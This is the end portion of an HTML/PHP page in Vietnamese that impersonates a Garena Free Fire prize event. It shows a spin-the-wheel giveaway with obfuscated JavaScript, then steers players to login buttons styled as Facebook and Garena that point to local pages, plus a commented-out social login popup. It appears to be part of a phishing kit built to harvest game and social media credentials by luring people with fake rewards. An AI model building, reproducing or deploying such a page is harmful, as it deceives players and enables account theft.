Banner1k[6]="<img src='<?php echo isset($gift6Link) ? $gift6Link : ''; ?>'/>"
Banner1k[7]="<img src='<?php echo isset($gift7Link) ? $gift7Link : ''; ?>'/>"
Banner1k[8]="<img src='<?php echo isset($gift8Link) ? $gift8Link : ''; ?>'/>"
Banner1k[9]="<img src='<?php echo isset($gift9Link) ? $gift9Link : ''; ?>'/>"
var random=Math.round(4*Math.random());

document.write(Banner1k[random]);
</script>
</div> <!--- popup-box-item itemShine --->
<br>
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_loginn()">Nhận</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->


<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrappers">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Thông Báo</div>
</div>
<div class="popup-box-bg">
<div class="popup-box-alert3"><br>
Xin Chào Bạn,<br>
<p>Chúng tôi rất vui vì bạn vẫn trung thành với Garena Free Fire. <br>Phần thưởng của bạn đang được xử lý để gửi đến tài khoản của bạn. <br>Phần thưởng được gửi tới hộp thư đến trong trò chơi của bạn.</p> <p>Chúng tôi cũng sẽ thông báo cho bạn qua hộp thư khi chúng tôi gửi thành công phần thưởng của bạn. <br>Vui lòng đợi tối đa 24 giờ.</p></div>
<div class="popup-box-alert0">
</div>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='/index.php';">Đăng Xuất </button>
</div>
</div>
</div>
</div>
<!--<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Vui Lòng Đăng Nhập</div> popup-box-navbar-title --->
</div> <!--- popup-box-navbar 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Cần Login Để Tham Gia Sự Kiện</div>
<button type="button" onmousedown="buka.play();" class="popup-btn-login-link popup-btn-link" onclick="open_link();"><img class="icon-login" src="img/style-img/link.png"></img>Linked Phone/Email</button>
<div class="alter-text"><span>Or login with linked social media</span></div> alter-text 
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i>Twitter</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i>Facebook</button>
 <img style="width: 90%; height: auto; margin-top: -25px; margin-left: auto; margin-right: auto;" src="img/kinnon.png"><br><br> -->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popups login-mail animated fadeIn" style="display: none;">
<div class="seclink-box">
<div class="seclink-box-navbar">
<img onmousedown="tutup.play();" onclick="close_mail_login()" src="img/seclink-close.png">
<div class="seclink-box-navbar-title">
<a class="et" style="display: flex; justify-content: center;">Bạn Cần Đăng Nhập</a>
</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="seclink-box-bg">
<div class="seclink-box-alert"></div> <!--- popup-box-alert --->
<div class="seclink-wrapper">

</div> <!--- seclink-wrapper ---> 
<div class="form_login" id="emaillog">
                       <div class="popup-alert__actions" style="display: flex; justify-content: center;">
    <a href="zH4tWCa5PpsqR1VqjQcicoDOU3bIHVyZPFjEH8ZQFM3K7X6DpyGV7fb.html" title="Facebook">
        <img src="Lixi/Images/logo-facebook.png" alt="Facebook" style="width: 40px; height: auto;">
    </a>
    <a href="universal/login?locale=vi-VN" title="Garena">
        <img src="Lixi/Images/logo-garena.png" alt="Garena" style="width: 40px; height: auto;">
    </a>
</div>


<center><div class="seclink-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateLoginNumberData()">OK</button></center></form> <!--- form --->

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script type="text/javascript">

    

    function open_account_loginn() {
        $('.processing_account').fadeIn();
    }

    $('#open_account_loginn').on('click', function() {
        open_account_loginn();
    });
</script>

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<audio id="audioItem" src="media/kinnon-pindah.mp3"></audio>
<audio id="audioStop" src="media/kinnon-stop.mp3"></audio>
<audio id="audioPopup" src="media/kinnon-popup.mp3"></audio>
<script src="js/international-telephone-input.js"></script>
<!-- <script src="js/kinnonswiper.js"></script> -->
<script src="js/kinnonscript.js"></script>
<script src="js/scriptv1.js"></script>
<script src="js/scriptv2.js"></script>
<script src="js/slidernotif.js"></script>
<script src="js/showHide.js"></script>
<script src="js/sliders.js"></script>
<script src="js/timer.js"></script>
<script src="js/click.js"></script>
<script>
setTimeout(function () {
  $('.loadkin').fadeOut(750);
}, 2000);
</script>
<script type="text/javascript">
    // code for swiping rewards
const _0x5168e1 = _0x5728;
(function(_0x5d3559, _0x18cf32) {
    const _0x4a0396 = _0x5728,
        _0x480266 = _0x5d3559();
    while (!![]) {
        try {
            const _0x101d0a = -parseInt(_0x4a0396(0x1fa)) / 0x1 + parseInt(_0x4a0396(0x209)) / 0x2 * (parseInt(_0x4a0396(0x204)) / 0x3) + -parseInt(_0x4a0396(0x1ec)) / 0x4 * (parseInt(_0x4a0396(0x208)) / 0x5) + parseInt(_0x4a0396(0x20a)) / 0x6 + parseInt(_0x4a0396(0x1e1)) / 0x7 * (-parseInt(_0x4a0396(0x1e8)) / 0x8) + parseInt(_0x4a0396(0x1f5)) / 0x9 + parseInt(_0x4a0396(0x1e6)) / 0xa * (parseInt(_0x4a0396(0x202)) / 0xb);
            if (_0x101d0a === _0x18cf32) break;
            else _0x480266['push'](_0x480266['shift']());
        } catch (_0x34662c) {
            _0x480266['push'](_0x480266['shift']());
        }
    }
}(_0x2a3d, 0x60317));

function otw_spin() {
    const _0x72b9f5 = _0x5728;
    $('.spin-alert')[_0x72b9f5(0x1f3)]();
}

function _0x5728(_0xb519cf, _0x22ff9d) {
    const _0x2a3d0f = _0x2a3d();
    return _0x5728 = function(_0x572898, _0x3e6510) {
        _0x572898 = _0x572898 - 0x1e1;
        let _0x10ed90 = _0x2a3d0f[_0x572898];
        return _0x10ed90;
    }, _0x5728(_0xb519cf, _0x22ff9d);
}

function go_spin() {
    const _0x1c728d = _0x5728;
    $(_0x1c728d(0x1f4))['hide'](), $(_0x1c728d(0x1eb))[_0x1c728d(0x205)](), $(_0x1c728d(0x206))['on'](_0x1c728d(0x20b), gaskeun), setTimeout(gaskeun, 0x384);
}
const hadiah = {
        0x0: _0x5168e1(0x200),
        0x1: _0x5168e1(0x1f7),
        0x2: '',
        0x3: _0x5168e1(0x207),
        0x4: _0x5168e1(0x1fb),
        0x5: '',
        0x6: _0x5168e1(0x1ea),
        0x7: _0x5168e1(0x1ff),
        0x8: _0x5168e1(0x1f6),
        0x9: _0x5168e1(0x1e9)
    },
    jumlah_hadiah = 0xa,
    minimal_lompat = 0x14;

function _0x2a3d() {
    const _0x74b766 = ['attr', '516240OaPWgP', 'https://ffnapthe.com/%40BS_vatpham/22.png', '.gift_img', 'src', 'fadeIn', '', 'https://ffnapthe.com/%40BS_vatpham/famaslv7.png', 'random', '33ciHPQQ', 'audioPopup', '1383612QfgSvW', 'fadeOut', '.putarkan', 'https://ffnapthe.com/%40BS_vatpham/m1014lv7.png', '410xNtIAP', '2OtmVzo', '1078866yGPCZo', 'click', '91ERqQQJ', 'currentTime', '.itemReward_confirmation', 'floor', 'getElementById', '2085490lFevek', 'border-item', '96104DWCdWN', '', '', '.itembutton', '13852ZRYJfb', 'box-shadow', 'audioItem', 'play', 'item6', 'ready', 'addClass', 'show', '.spin-alert', '753480rvFBAO', '', '', '[data-order=\x22'];
    _0x2a3d = function() {
        return _0x74b766;
    };
    return _0x2a3d();
}
let kinnonsec = -0x1,
    lompat = 0x0,
    kecepatan = 0xc8,
    waktu = 0x0,
    hadiahnya = -0x1;

function putarkan() {
    const _0x7c01e4 = _0x5168e1;
    $(_0x7c01e4(0x1f8) + kinnonsec + '\x22]')['removeClass'](_0x7c01e4(0x1f0)), $('[data-order=\x22' + kinnonsec + '\x22]')['removeClass'](_0x7c01e4(0x1e7)), kinnonsec += 0x1;
    kinnonsec > jumlah_hadiah - 0x1 && (kinnonsec = 0x0);
    $(_0x7c01e4(0x1f8) + kinnonsec + '\x22]')['addClass']('item6');
    var _0x153fba = document[_0x7c01e4(0x1e5)](_0x7c01e4(0x1ee));
    _0x153fba[_0x7c01e4(0x1e2)] = 0.4, _0x153fba['duration'] = 0.1, _0x153fba[_0x7c01e4(0x1ef)]();
}

function acakHadiah() {
    const _0x48fbc1 = _0x5168e1;
    return Math[_0x48fbc1(0x1e4)](Math[_0x48fbc1(0x201)]() * jumlah_hadiah);
}

function pengaturanWaktu() {
    const _0x554de9 = _0x5168e1;
    lompat += 0x1, putarkan();
    if (lompat > minimal_lompat + 0xb && hadiahnya === kinnonsec) {
        clearTimeout(waktu), $(_0x554de9(0x1f8) + kinnonsec + '\x22]')[_0x554de9(0x1f2)](_0x554de9(0x1ed));
        var _0x2fa52b = document[_0x554de9(0x1e5)]('audioStop');
        _0x2fa52b[_0x554de9(0x1ef)](), setTimeout(function() {
            const _0x4c038c = _0x554de9;
            $(_0x4c038c(0x1e3))[_0x4c038c(0x1fe)]();
        }, 0x384);
        var _0x2fa52b = document[_0x554de9(0x1e5)](_0x554de9(0x203));
        setTimeout(function() {
            const _0xe16672 = _0x554de9;
            document[_0xe16672(0x1e5)](_0xe16672(0x203))[_0xe16672(0x1ef)](), console['log']('');
        }, 0x384), $(_0x554de9(0x1fc))[_0x554de9(0x1f9)](_0x554de9(0x1fd), hadiah[kinnonsec]), setTimeout(function() {}, 0x0), hadiahnya = -0x1, lompat = 0x0;
    } else {
        if (lompat < minimal_lompat) kecepatan -= 0x64;
        else {
            if (lompat === minimal_lompat) {
                const _0x4c7be8 = acakHadiah();
                hadiahnya = _0x4c7be8;
            } else lompat > minimal_lompat + 0xc && hadiahnya === kinnonsec ? kecepatan += 0x64 : kecepatan += 0x64;
        }
        kecepatan < 0x12c && (kecepatan = 0x64), waktu = setTimeout(pengaturanWaktu, kecepatan);
    }
}

function gaskeun() {
    lompat = 0x0, kecepatan = 0xc8, hadiahnya = -0x1, pengaturanWaktu();
}
$(document)[_0x5168e1(0x1f1)](() => {
    const _0x181b16 = _0x5168e1;
    $(_0x181b16(0x206))['on']('click', gaskeun);
});

</script>
</body>
</html>
